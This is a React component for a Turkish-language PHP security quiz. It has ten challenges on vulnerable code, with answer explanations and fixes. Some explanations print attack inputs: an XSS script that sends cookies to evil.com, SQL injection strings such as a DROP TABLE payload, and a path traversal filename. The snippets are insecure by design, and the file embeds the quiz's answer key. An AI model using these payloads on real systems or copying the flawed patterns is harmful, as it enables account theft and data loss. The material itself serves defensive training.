import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Separator } from "@/components/ui/separator";
import { 
  Target, CheckCircle2, XCircle, AlertTriangle, Eye, 
  Database, Lock, Shield, ChevronRight, RotateCcw, Trophy,
  Bug
} from "lucide-react";

interface Challenge {
  id: number;
  title: string;
  description: string;
  difficulty: "Kolay" | "Orta" | "Zor";
  category: string;
  icon: React.ReactNode;
  code: string;
  question: string;
  options: { text: string; isCorrect: boolean; explanation: string }[];
}

const challenges: Challenge[] = [
  {
    id: 1,
    title: "SQL Injection Tespiti",
    description: "Bu kodda güvenlik açığı var mı?",
    difficulty: "Kolay",
    category: "SQL Injection",
    icon: <Database className="w-5 h-5" />,
    code: `$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = " . $id;
$result = mysqli_query($conn, $query);
$product = mysqli_fetch_assoc($result);
echo $product['name'];`,
    question: "Bu kodda hangi güvenlik açığı bulunmaktadır?",
    options: [
      { text: "SQL Injection - Kullanıcı girdisi doğrudan sorguya ekleniyor", isCorrect: true, explanation: "Doğru! $id değişkeni doğrudan SQL sorgusuna ekleniyor. Saldırgan '1 OR 1=1' gibi bir girdi ile tüm ürünleri listeleyebilir veya 'DROP TABLE' ile tabloyu silebilir. Prepared statement kullanılmalıdır." },
      { text: "XSS - Çıktı temizlenmemiş", isCorrect: false, explanation: "XSS de bir sorun olabilir (echo satırında), ancak asıl kritik güvenlik açığı SQL Injection'dır." },
      { text: "Bu kod güvenlidir", isCorrect: false, explanation: "Hayır! Bu kod SQL Injection'a tamamen açıktır. Kullanıcı girdisi hiçbir doğrulama yapılmadan sorguya eklenmektedir." },
      { text: "Sadece performans sorunu var", isCorrect: false, explanation: "Bu bir performans sorunu değil, kritik bir güvenlik açığıdır." },
    ],
  },
  {
    id: 2,
    title: "Parola Saklama Güvenliği",
    description: "Bu kayıt sistemi güvenli mi?",
    difficulty: "Kolay",
    category: "Parola Güvenliği",
    icon: <Lock className="w-5 h-5" />,
    code: `$password = $_POST['password'];
$hashed = md5($password);

$stmt = $pdo->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
$stmt->execute([$_POST['email'], $hashed]);
echo "Kayıt başarılı!";`,
    question: "Bu parola saklama yöntemi neden güvenli değildir?",
    options: [
      { text: "Prepared statement kullanılmamış", isCorrect: false, explanation: "Aslında prepared statement kullanılmış, PDO ile parametreli sorgu var." },
      { text: "MD5 hash artık güvenli değildir, password_hash() kullanılmalı", isCorrect: true, explanation: "Doğru! MD5 çok hızlı bir hash algoritmasıdır ve rainbow table saldırılarına karşı savunmasızdır. PHP'nin password_hash(PASSWORD_ARGON2ID) fonksiyonu salt ekler ve yavaş hash algoritması kullanır." },
      { text: "E-posta doğrulaması yapılmamış", isCorrect: false, explanation: "E-posta doğrulaması da eksik olabilir ama asıl kritik sorun MD5 kullanımıdır." },
      { text: "Bu kod gayet güvenli", isCorrect: false, explanation: "Hayır! MD5 ile hash'lenmiş parolalar saniyeler içinde kırılabilir." },
    ],
  },
  {
    id: 3,
    title: "XSS Saldırısı Tespiti",
    description: "Kullanıcı profil sayfasında bir açık var.",
    difficulty: "Kolay",
    category: "XSS",
    icon: <Eye className="w-5 h-5" />,
    code: `// Kullanıcı profil sayfası
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$user = $stmt->fetch();

echo "<h1>Profil: " . $user['username'] . "</h1>";
echo "<p>Hakkında: " . $user['bio'] . "</p>";
echo "<p>Website: <a href='" . $user['website'] . "'>" . $user['website'] . "</a></p>";`,
    question: "Bu kodda XSS saldırısı nasıl gerçekleştirilebilir?",
    options: [
      { text: "SQL Injection ile veritabanına erişilebilir", isCorrect: false, explanation: "SQL sorgusunda prepared statement kullanıldığı için SQL Injection riski düşüktür." },
      { text: "Kullanıcı bio veya username alanına script kodu gömebilir", isCorrect: true, explanation: "Doğru! Veritabanından gelen veriler htmlspecialchars() ile temizlenmeden doğrudan HTML'e basılıyor. Bir kullanıcı bio alanına <script>document.location='http://evil.com?c='+document.cookie</script> yazabilir." },
      { text: "Website alanı sadece URL formatında olmalı", isCorrect: false, explanation: "URL doğrulama da yapılmalı, ancak asıl sorun tüm çıktıların escape edilmemiş olmasıdır." },
      { text: "Session kullanılmamış", isCorrect: false, explanation: "Session kullanımı bu bağlamda asıl sorun değildir." },
    ],
  },
  {
    id: 4,
    title: "CSRF Koruması",
    description: "Bu formu inceleyin.",
    difficulty: "Orta",
    category: "CSRF",
    icon: <Shield className="w-5 h-5" />,
    code: `// Para transfer formu
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to = $_POST['recipient'];
    $amount = $_POST['amount'];
    
    $stmt = $pdo->prepare("
        UPDATE accounts SET balance = balance - ? WHERE user_id = ?
    ");
    $stmt->execute([$amount, $_SESSION['user_id']]);
    
    $stmt = $pdo->prepare("
        UPDATE accounts SET balance = balance + ? WHERE user_id = ?
    ");
    $stmt->execute([$amount, $to]);
    
    echo "Transfer başarılı!";
}`,
    question: "Bu para transfer işleminde en kritik eksiklik nedir?",
    options: [
      { text: "Input doğrulama eksik", isCorrect: false, explanation: "Input doğrulama da eksik, ancak en kritik eksiklik CSRF korumasıdır." },
      { text: "Transaction kullanılmamış", isCorrect: false, explanation: "Transaction kullanımı da önemli, ancak güvenlik açısından en kritik sorun CSRF'dir." },
      { text: "CSRF token kontrolü yok - sahte formla para transferi yapılabilir", isCorrect: true, explanation: "Doğru! CSRF token olmadan, saldırgan kendi sitesine gizli bir form koyarak kurbanın tarayıcısını bu endpoint'e istek yapmaya zorlayabilir. Kurban bankaya giriş yapmışsa, para transferi otomatik gerçekleşir." },
      { text: "Bakiye kontrolü yapılmamış", isCorrect: false, explanation: "Bakiye kontrolü de eksik, ancak bu bir iş mantığı hatası; CSRF ise güvenlik açığıdır." },
    ],
  },
  {
    id: 5,
    title: "Dosya Yükleme Güvenliği",
    description: "Bu dosya yükleme kodu güvenli mi?",
    difficulty: "Orta",
    category: "Dosya Yükleme",
    icon: <AlertTriangle className="w-5 h-5" />,
    code: `// Dosya yükleme işlemi
if (isset($_FILES['avatar'])) {
    $file = $_FILES['avatar'];
    $filename = $file['name'];
    $destination = "uploads/" . $filename;
    
    // Uzantı kontrolü
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    if (in_array($ext, ['jpg', 'png', 'gif'])) {
        move_uploaded_file($file['tmp_name'], $destination);
        echo "Dosya yüklendi: " . $destination;
    }
}`,
    question: "Bu dosya yükleme kodundaki güvenlik açıkları nelerdir?",
    options: [
      { text: "Sadece uzantı kontrolü yeterlidir, kod güvenli", isCorrect: false, explanation: "Uzantı kontrolü tek başına yeterli değildir. Dosya içeriği doğrulanmalıdır." },
      { text: "Orijinal dosya adı kullanılıyor, MIME kontrolü yok, uploads klasörü erişime açık", isCorrect: true, explanation: "Doğru! 1) Orijinal dosya adı kullanılarak path traversal saldırısı (../../../evil.php) yapılabilir. 2) Uzantı kontrolü client tarafından manipüle edilebilir, finfo ile gerçek MIME tipi kontrol edilmeli. 3) Uploads klasörü web üzerinden doğrudan erişilebilir olmamalı. Dosya adı için random_bytes() kullanılmalı." },
      { text: "Dosya boyutu kontrolü eksik", isCorrect: false, explanation: "Dosya boyutu kontrolü de eksik ama asıl kritik sorunlar dosya adı, MIME doğrulama ve dizin güvenliğidir." },
      { text: "Yükleme dizini yanlış", isCorrect: false, explanation: "Dizin yolu değil, dizinin güvenliği ve dosya adlandırma yöntemi asıl sorundur." },
    ],
  },
  {
    id: 6,
    title: "Session Hijacking",
    description: "Bu oturum yönetimi kodunu inceleyin.",
    difficulty: "Orta",
    category: "Oturum Güvenliği",
    icon: <Lock className="w-5 h-5" />,
    code: `// Giriş sonrası oturum başlatma
session_start();
$_SESSION['user_id'] = $user['id'];
$_SESSION['username'] = $user['username'];
$_SESSION['role'] = $user['role'];

// Oturum kontrol fonksiyonu
function check_login() {
    session_start();
    if (!isset($_SESSION['user_id'])) {
        header('Location: login.php');
        exit;
    }
}`,
    question: "Bu oturum yönetiminde hangi güvenlik önlemleri eksiktir?",
    options: [
      { text: "Session ID yenilenmemiş, cookie güvenlik bayrakları ayarlanmamış, IP/User-Agent doğrulaması yok", isCorrect: true, explanation: "Doğru! 1) session_regenerate_id(true) ile session fixation engellenmeli. 2) Cookie'ler httponly, secure, samesite bayraklarıyla korunmalı. 3) IP ve User-Agent değişikliği tespit edilmeli. 4) İnaktivite timeout'u eklenmeli." },
      { text: "Kullanıcı rolü session'da tutulmamalı", isCorrect: false, explanation: "Rol bilgisi session'da tutulabilir, ancak her kritik işlemde veritabanından doğrulanmalıdır." },
      { text: "Session yerine JWT kullanılmalı", isCorrect: false, explanation: "JWT her durumda daha iyi değildir. Server-side session güvenli yapılandırıldığında çok etkilidir." },
      { text: "Bu kod yeterince güvenli", isCorrect: false, explanation: "Hayır! Session fixation, session hijacking ve session timeout gibi temel korumalar eksiktir." },
    ],
  },
  {
    id: 7,
    title: "Gelişmiş SQL Injection",
    description: "Bu arama fonksiyonu güvenli mi?",
    difficulty: "Zor",
    category: "SQL Injection",
    icon: <Database className="w-5 h-5" />,
    code: `// Ürün arama ve sıralama
$search = $_GET['q'];
$sort = $_GET['sort'] ?? 'name';
$order = $_GET['order'] ?? 'ASC';

$stmt = $pdo->prepare("
    SELECT * FROM products 
    WHERE name LIKE ? 
    ORDER BY $sort $order
");
$stmt->execute(["%$search%"]);`,
    question: "Bu kodda prepared statement kullanılmasına rağmen neden hâlâ güvenlik açığı vardır?",
    options: [
      { text: "LIKE sorgusu güvenli değildir", isCorrect: false, explanation: "LIKE ile prepared statement güvenlidir, ancak % ve _ karakterleri filtrelenmezse istenmeyen sonuçlar döner." },
      { text: "ORDER BY kısmında $sort ve $order parametreleri doğrudan ekleniyor", isCorrect: true, explanation: "Doğru! Prepared statement parametreleri tablo/kolon adları veya ORDER BY ifadelerinde kullanılamaz. $sort ve $order değişkenleri doğrudan sorguya ekleniyor. Saldırgan sort=id; DROP TABLE products-- yazabilir. Whitelist ile doğrulama yapılmalıdır:\n$allowed_sorts = ['name', 'price', 'created_at'];\n$sort = in_array($sort, $allowed_sorts) ? $sort : 'name';" },
      { text: "PDO yerine MySQLi kullanılmalı", isCorrect: false, explanation: "PDO gayet güvenli bir seçenektir, sorun PDO değil kullanım şeklidir." },
      { text: "Pagination eksik", isCorrect: false, explanation: "Pagination önemli ama buradaki güvenlik açığı ORDER BY injection'dır." },
    ],
  },
  {
    id: 8,
    title: "Deserialization Saldırısı",
    description: "Bu cookie işleme kodu güvenli mi?",
    difficulty: "Zor",
    category: "Deserialization",
    icon: <Bug className="w-5 h-5" />,
    code: `// Kullanıcı tercihlerini cookie'den oku
$preferences = unserialize($_COOKIE['user_prefs']);

// Tercihleri uygula
if ($preferences instanceof UserPreferences) {
    $theme = $preferences->getTheme();
    $language = $preferences->getLanguage();
    $timezone = $preferences->getTimezone();
}

// Tercihleri kaydet
setcookie('user_prefs', serialize($preferences), time() + 86400);`,
    question: "Bu kodda neden kritik bir güvenlik açığı bulunmaktadır?",
    options: [
      { text: "Cookie şifrelenmemiş", isCorrect: false, explanation: "Şifreleme de eksik ama asıl tehlike unserialize() kullanımıdır." },
      { text: "unserialize() ile PHP Object Injection saldırısı yapılabilir", isCorrect: true, explanation: "Doğru! unserialize() kullanıcı girdisi ile çağrıldığında, saldırgan kötü amaçlı PHP nesneleri oluşturabilir. __wakeup(), __destruct() gibi magic method'lar otomatik çalışarak RCE (Remote Code Execution) sağlayabilir. Çözüm: json_encode/json_decode kullanın veya allowed_classes parametresi belirleyin." },
      { text: "Cookie boyutu çok büyük olabilir", isCorrect: false, explanation: "Boyut bir kısıtlama olabilir ama güvenlik açığı unserialize()'dır." },
      { text: "instanceof kontrolü yeterli koruma sağlar", isCorrect: false, explanation: "instanceof kontrolü unserialize()'dan SONRA çalışır. Magic method'lar zaten unserialize sırasında tetiklenmiştir." },
    ],
  },
  {
    id: 9,
    title: "Rate Limiting Bypass",
    description: "Bu rate limiting implementasyonunu inceleyin.",
    difficulty: "Zor",
    category: "Rate Limiting",
    icon: <Shield className="w-5 h-5" />,
    code: `// API Rate Limiting
function checkRateLimit() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $key = "rate_limit:" . $ip;
    
    $attempts = apcu_fetch($key);
    if ($attempts === false) {
        apcu_store($key, 1, 60); // 60 saniye TTL
        return true;
    }
    
    if ($attempts >= 100) {
        http_response_code(429);
        echo json_encode(['error' => 'Too many requests']);
        return false;
    }
    
    apcu_inc($key);
    return true;
}`,
    question: "Bu rate limiting nasıl bypass edilebilir?",
    options: [
      { text: "100 istek yeterlidir, sınır artırılmalı", isCorrect: false, explanation: "Sınır miktarı değil, bypass yöntemleri asıl sorundur." },
      { text: "X-Forwarded-For header ile IP spoofing yapılabilir, proxy arkasında gerçek IP alınamaz", isCorrect: true, explanation: "Doğru! REMOTE_ADDR proxy/load balancer arkasında her zaman gerçek IP'yi vermez. Saldırgan X-Forwarded-For header'ı ile farklı IP adresleri taklit edebilir. Çözüm: 1) Güvenilir proxy zinciri doğrulayın. 2) API key bazlı rate limiting ekleyin. 3) Kullanıcı bazlı (user_id) sınırlama yapın. 4) Sliding window algoritması kullanın." },
      { text: "APCu yerine Redis kullanılmalı", isCorrect: false, explanation: "Redis daha iyi ölçeklenebilir ama bypass sorunu IP tespiti ile ilgilidir." },
      { text: "60 saniye çok kısa, süre artırılmalı", isCorrect: false, explanation: "Süre ayarı değil, IP tespiti yöntemi asıl zafiyettir." },
    ],
  },
  {
    id: 10,
    title: "Güvenli Kod İncelemesi",
    description: "Bu kodu güvenlik açısından değerlendirin.",
    difficulty: "Zor",
    category: "Genel Güvenlik",
    icon: <Target className="w-5 h-5" />,
    code: `// Admin paneli erişim kontrolü
if ($_SESSION['role'] === 'admin') {
    // Admin işlemleri
    if ($_POST['action'] === 'delete_user') {
        $user_id = intval($_POST['user_id']);
        $pdo->exec("DELETE FROM users WHERE id = $user_id");
        
        // Log kaydı
        $log = fopen('/var/log/admin.log', 'a');
        fwrite($log, date('Y-m-d H:i:s') . " - User $user_id deleted by " . 
               $_SESSION['username'] . " from IP " . $_SERVER['REMOTE_ADDR'] . "\\n");
        fclose($log);
    }
}`,
    question: "Bu admin paneli kodunda kaç farklı güvenlik sorunu tespit edebilirsiniz?",
    options: [
      { text: "1-2 sorun: SQL injection ve log injection", isCorrect: false, explanation: "Daha fazla sorun var! intval() SQL injection'ı engellese de exec() yerine prepared statement tercih edilmeli." },
      { text: "3-4 sorun: CSRF yok, exec() kullanımı, log injection, rol doğrulama yetersiz", isCorrect: true, explanation: "Doğru! 1) CSRF token kontrolü yok - sahte istekle kullanıcı silinebilir. 2) exec() yerine prepare() kullanılmalı. 3) Log dosyasına kullanıcı verisi yazılırken sanitize edilmiyor (log injection). 4) Session'daki role bilgisi her işlemde veritabanından doğrulanmalı. 5) İşlem sonucu kullanıcıya bildirilmiyor (hata yönetimi eksik)." },
      { text: "Kod güvenli, intval() ve session kontrolü yeterli", isCorrect: false, explanation: "Kesinlikle yeterli değil! Birçok katmanda güvenlik eksikleri mevcut." },
      { text: "Sadece CSRF eksik", isCorrect: false, explanation: "CSRF en belirgin sorun ama tek sorun değil." },
    ],
  },
];

const difficultyColor = (d: string) => {
  switch (d) {
    case "Kolay": return "bg-success/20 text-success border-success/30";
    case "Orta": return "bg-warning/20 text-warning border-warning/30";
    case "Zor": return "bg-danger/20 text-danger border-danger/30";
    default: return "";
  }
};

const SecurityChallenges = () => {
  const [currentChallenge, setCurrentChallenge] = useState<number | null>(null);
  const [selectedAnswer, setSelectedAnswer] = useState<number | null>(null);
  const [answeredChallenges, setAnsweredChallenges] = useState<Record<number, boolean>>({});
  const [showList, setShowList] = useState(true);

  const challenge = currentChallenge !== null ? challenges.find(c => c.id === currentChallenge) : null;

  const handleSelect = (optionIndex: number) => {
    if (selectedAnswer !== null || !challenge) return;
    setSelectedAnswer(optionIndex);
    setAnsweredChallenges(prev => ({
      ...prev,
      [challenge.id]: challenge.options[optionIndex].isCorrect,
    }));
  };

  const correctCount = Object.values(answeredChallenges).filter(Boolean).length;
  const totalAnswered = Object.keys(answeredChallenges).length;

  const startChallenge = (id: number) => {
    setCurrentChallenge(id);
    setSelectedAnswer(answeredChallenges[id] !== undefined ? -1 : null); // -1 = already answered, show review
    setShowList(false);
  };

  const backToList = () => {
    setShowList(true);
    setCurrentChallenge(null);
    setSelectedAnswer(null);
  };

  const resetAll = () => {
    setAnsweredChallenges({});
    setCurrentChallenge(null);
    setSelectedAnswer(null);
    setShowList(true);
  };

  return (
    <div className="container mx-auto py-8 space-y-8">
      {/* Header */}
      <div className="text-center space-y-4 animate-fade-in">
        <div className="flex items-center justify-center space-x-3">
          <Target className="w-12 h-12 text-warning animate-security-pulse" />
          <h1 className="text-4xl font-bold gradient-text">Güvenlik Senaryoları</h1>
        </div>
        <p className="text-xl text-muted-foreground max-w-3xl mx-auto">
          PHP kodlarındaki güvenlik açıklarını tespit edin ve kendinizi test edin.
        </p>
        {totalAnswered > 0 && (
          <div className="flex items-center justify-center gap-4">
            <Badge className="bg-primary/20 text-primary border-primary/30 text-lg px-4 py-2">
              <Trophy className="w-4 h-4 mr-2" />
              {correctCount}/{totalAnswered} Doğru
            </Badge>
            <Button variant="outline" size="sm" onClick={resetAll}>
              <RotateCcw className="w-4 h-4 mr-1" /> Sıfırla
            </Button>
          </div>
        )}
      </div>

      <Separator />

      {showList ? (
        /* Challenge List */
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 animate-fade-in">
          {challenges.map((ch) => {
            const answered = answeredChallenges[ch.id];
            return (
              <Card
                key={ch.id}
                className="security-card cursor-pointer group"
                onClick={() => startChallenge(ch.id)}
              >
                <CardHeader className="pb-3">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className="text-primary">{ch.icon}</div>
                      <CardTitle className="text-base">{ch.title}</CardTitle>
                    </div>
                    <div className="flex items-center gap-2">
                      {answered !== undefined && (
                        answered
                          ? <CheckCircle2 className="w-5 h-5 text-success" />
                          : <XCircle className="w-5 h-5 text-danger" />
                      )}
                      <Badge className={difficultyColor(ch.difficulty)}>{ch.difficulty}</Badge>
                    </div>
                  </div>
                  <CardDescription className="flex items-center justify-between">
                    <span>{ch.category}</span>
                    <ChevronRight className="w-4 h-4 text-muted-foreground group-hover:translate-x-1 transition-transform" />
                  </CardDescription>
                </CardHeader>
              </Card>
            );
          })}
        </div>
      ) : challenge ? (
        /* Challenge Detail */
        <div className="max-w-4xl mx-auto space-y-6 animate-fade-in">
          <Button variant="ghost" onClick={backToList} className="mb-2">
            ← Listeye Dön
          </Button>

          <Card className="security-card">
            <CardHeader>
              <div className="flex items-center justify-between flex-wrap gap-2">
                <div className="flex items-center gap-2">
                  <div className="text-primary">{challenge.icon}</div>
                  <CardTitle className="text-xl">{challenge.title}</CardTitle>
                </div>
                <Badge className={difficultyColor(challenge.difficulty)}>{challenge.difficulty}</Badge>
              </div>
              <CardDescription>{challenge.description}</CardDescription>
            </CardHeader>
            <CardContent>
              {/* Code Block */}
              <div className="rounded-lg border border-border bg-muted/30 p-4 mb-6 overflow-x-auto">
                <pre className="text-sm font-mono whitespace-pre text-foreground">{challenge.code}</pre>
              </div>

              {/* Question */}
              <h3 className="text-lg font-semibold mb-4 text-foreground">{challenge.question}</h3>

              {/* Options */}
              <div className="space-y-3">
                {challenge.options.map((option, idx) => {
                  const isSelected = selectedAnswer === idx;
                  const isRevealed = selectedAnswer !== null;
                  let borderClass = "border-border hover:border-primary/50";

                  if (isRevealed) {
                    if (option.isCorrect) {
                      borderClass = "border-success bg-success/5";
                    } else if (isSelected && !option.isCorrect) {
                      borderClass = "border-danger bg-danger/5";
                    } else {
                      borderClass = "border-border opacity-60";
                    }
                  }

                  return (
                    <div
                      key={idx}
                      onClick={() => handleSelect(idx)}
                      className={`p-4 rounded-lg border-2 transition-all cursor-pointer ${borderClass} ${
                        !isRevealed ? "hover:shadow-md" : "cursor-default"
                      }`}
                    >
                      <div className="flex items-start gap-3">
                        <div className="mt-0.5">
                          {isRevealed ? (
                            option.isCorrect ? (
                              <CheckCircle2 className="w-5 h-5 text-success" />
                            ) : isSelected ? (
                              <XCircle className="w-5 h-5 text-danger" />
                            ) : (
                              <div className="w-5 h-5 rounded-full border-2 border-muted-foreground/30" />
                            )
                          ) : (
                            <div className="w-5 h-5 rounded-full border-2 border-muted-foreground/50" />
                          )}
                        </div>
                        <div className="flex-1">
                          <p className="font-medium text-foreground">{option.text}</p>
                          {isRevealed && (
                            <p className="mt-2 text-sm text-muted-foreground leading-relaxed">
                              {option.explanation}
                            </p>
                          )}
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Next Challenge */}
              {selectedAnswer !== null && (
                <div className="flex justify-end mt-6">
                  {challenge.id < challenges.length ? (
                    <Button onClick={() => {
                      setSelectedAnswer(null);
                      setCurrentChallenge(challenge.id + 1);
                    }}>
                      Sonraki Soru <ChevronRight className="w-4 h-4 ml-1" />
                    </Button>
                  ) : (
                    <Button onClick={backToList}>
                      Sonuçları Gör <Trophy className="w-4 h-4 ml-1" />
                    </Button>
                  )}
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      ) : null}
    </div>
  );
};

export default SecurityChallenges;
